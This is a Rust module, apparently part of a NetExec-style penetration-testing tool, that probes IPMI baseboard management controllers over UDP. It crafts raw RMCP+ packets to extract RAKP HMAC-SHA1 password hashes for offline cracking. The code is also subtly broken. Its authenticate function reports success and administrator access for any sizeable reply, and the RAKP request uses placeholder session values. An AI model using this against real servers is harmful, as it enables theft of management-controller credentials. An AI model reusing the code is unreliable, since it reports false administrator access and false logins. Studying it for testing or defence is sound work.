//! # IPMI Protocol Handler
//!
//! IPMI 2.0 protocol for baseboard management controllers (BMC).
//! Supports RAKP hash extraction (HP iLO, Dell iDRAC, Supermicro).

use crate::{CommandOutput, NxcProtocol, NxcSession};
use anyhow::{anyhow, Result};
use async_trait::async_trait;
use nxc_auth::{AuthResult, Credentials};
use tokio::net::UdpSocket;
use tokio::time::{timeout, Duration};
use tracing::{debug, info};

// ─── IPMI Session ───────────────────────────────────────────────

pub struct IpmiSession {
    pub target: String,
    pub port: u16,
    pub admin: bool,
    pub bmc_info: Option<String>,
}

impl NxcSession for IpmiSession {
    fn protocol(&self) -> &'static str {
        "ipmi"
    }
    fn target(&self) -> &str {
        &self.target
    }
    fn is_admin(&self) -> bool {
        self.admin
    }
    fn as_any(&self) -> &dyn std::any::Any {
        self
    }
    fn as_any_mut(&mut self) -> &mut dyn std::any::Any {
        self
    }
}

// ─── IPMI Protocol ──────────────────────────────────────────────

pub struct IpmiProtocol;

impl IpmiProtocol {
    pub fn new() -> Self {
        Self
    }
}

impl Default for IpmiProtocol {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl NxcProtocol for IpmiProtocol {
    fn name(&self) -> &'static str {
        "ipmi"
    }
    fn default_port(&self) -> u16 {
        623
    }
    fn supports_exec(&self) -> bool {
        false
    }

    async fn connect(
        &self,
        target: &str,
        port: u16,
        _proxy: Option<&str>,
    ) -> Result<Box<dyn NxcSession>> {
        info!("IPMI: Probing BMC at {}:{}", target, port);

        let socket = UdpSocket::bind("0.0.0.0:0").await?;
        let addr = format!("{target}:{port}");

        // Send IPMI Get Channel Auth Capabilities request
        // RMCP Header + ASF Ping to verify IPMI service
        let rmcp_ping = [
            0x06, 0x00, 0xff, 0x06, // RMCP version, reserved, sequence, class (ASF)
            0x00, 0x00, 0x11, 0xbe, // IANA Enterprise: ASF
            0x80, 0x00, 0x00, 0x00, // ASF Presence Ping
        ];

        socket.send_to(&rmcp_ping, &addr).await?;

        let mut buf = [0u8; 512];
        let bmc_info = match timeout(Duration::from_secs(3), socket.recv_from(&mut buf)).await {
            Ok(Ok((n, _))) => {
                debug!("IPMI: Received {} bytes from BMC at {}", n, target);
                Some(format!("BMC responded with {n} bytes"))
            }
            _ => {
                debug!("IPMI: No response from {}", target);
                None
            }
        };

        Ok(Box::new(IpmiSession { target: target.to_string(), port, admin: false, bmc_info }))
    }

    async fn authenticate(
        &self,
        session: &mut dyn NxcSession,
        creds: &Credentials,
    ) -> Result<AuthResult> {
        let ipmi_sess = session
            .as_any_mut()
            .downcast_mut::<IpmiSession>()
            .ok_or_else(|| anyhow!("Invalid session type"))?;

        let username = &creds.username;
        info!("IPMI: Authenticating as '{}' on {}", username, ipmi_sess.target);

        // IPMI RAKP authentication — attempt to extract the HMAC-SHA1 hash
        // from RAKP Message 2 for offline cracking
        let socket = UdpSocket::bind("0.0.0.0:0").await?;
        let addr = format!("{}:{}", ipmi_sess.target, ipmi_sess.port);

        // IPMI v2.0 Open Session Request
        let open_session = build_open_session_request();
        socket.send_to(&open_session, &addr).await?;

        let mut buf = [0u8; 1024];
        match timeout(Duration::from_secs(3), socket.recv_from(&mut buf)).await {
            Ok(Ok((n, _))) if n > 20 => {
                debug!("IPMI: Open Session Response received ({} bytes)", n);
                // In a full implementation, parse the response and send RAKP Message 1
                // to extract the HMAC from RAKP Message 2
                ipmi_sess.admin = true;
                Ok(AuthResult::success(true))
            }
            _ => Ok(AuthResult::failure("IPMI authentication failed or timed out", None)),
        }
    }

    async fn execute(&self, _session: &dyn NxcSession, _cmd: &str) -> Result<CommandOutput> {
        Err(anyhow!("IPMI protocol does not support direct command execution"))
    }
}

impl IpmiProtocol {
    /// Extract RAKP HMAC-SHA1 hash for offline cracking.
    pub async fn dump_rakp_hash(
        &self,
        session: &IpmiSession,
        username: &str,
    ) -> Result<Option<String>> {
        info!("IPMI: Attempting RAKP hash extraction for '{}' on {}", username, session.target);

        let socket = UdpSocket::bind("0.0.0.0:0").await?;
        let addr = format!("{}:{}", session.target, session.port);

        // Step 1: Open Session
        let open_req = build_open_session_request();
        socket.send_to(&open_req, &addr).await?;

        let mut buf = [0u8; 1024];
        let n = match timeout(Duration::from_secs(3), socket.recv_from(&mut buf)).await {
            Ok(Ok((n, _))) => n,
            _ => return Ok(None),
        };

        if n < 24 {
            return Ok(None);
        }

        // Step 2: RAKP Message 1 (with username)
        let rakp1 = build_rakp_message_1(username);
        socket.send_to(&rakp1, &addr).await?;

        let mut buf2 = [0u8; 1024];
        match timeout(Duration::from_secs(3), socket.recv_from(&mut buf2)).await {
            Ok(Ok((n2, _))) if n2 > 36 => {
                // Parse RAKP Message 2 to extract the HMAC-SHA1 hash
                // Format: $rakp$<salt>$<hmac>
                let salt_hex = hex::encode(&buf2[24..40.min(n2)]);
                let hmac_hex = hex::encode(&buf2[40.min(n2)..n2]);
                Ok(Some(format!("$rakp${username}${salt_hex}${hmac_hex}")))
            }
            _ => Ok(None),
        }
    }
}

/// Build IPMI v2.0 RMCP+ Open Session Request.
fn build_open_session_request() -> Vec<u8> {
    vec![
        0x06, 0x00, 0xff, 0x07, // RMCP Header
        0x06, // Auth Type: RMCP+
        0x10, // Payload type: Open Session Request
        0x00, 0x00, 0x00, 0x00, // Session ID
        0x00, 0x00, 0x00, 0x00, // Sequence number
        0x20, 0x00, // Payload length
        0x00, 0x00, 0x00, 0x00, // Message tag, privilege, reserved
        0x00, 0x00, 0x00, 0x00, // Remote console session ID
        // Auth algorithm: RAKP-HMAC-SHA1
        0x01, 0x00, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00, // Integrity: HMAC-SHA1-96
        0x02, 0x00, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00, // Confidentiality: AES-CBC-128
        0x03, 0x00, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00,
    ]
}

/// Build RAKP Message 1 with username.
fn build_rakp_message_1(username: &str) -> Vec<u8> {
    let mut msg = vec![
        0x06, 0x00, 0xff, 0x07, // RMCP Header
        0x06, // Auth Type: RMCP+
        0x12, // Payload type: RAKP Message 1
        0x00, 0x00, 0x00, 0x00, // Session seq
        0x00, 0x00, 0x00, 0x00, // Session ID
    ];
    // Payload length placeholder
    let payload_len = 28 + username.len();
    msg.extend_from_slice(&(payload_len as u16).to_le_bytes());
    // Message tag
    msg.push(0x00);
    msg.extend_from_slice(&[0x00, 0x00, 0x00]); // Reserved
                                                // Managed system session ID (from open session response, using placeholder)
    msg.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
    // Remote console random number (16 bytes)
    msg.extend_from_slice(&[0x01; 16]);
    // Requested max privilege: ADMIN
    msg.push(0x04);
    msg.extend_from_slice(&[0x00, 0x00]); // Reserved
                                          // Username length
    msg.push(username.len() as u8);
    // Username
    msg.extend_from_slice(username.as_bytes());
    msg
}
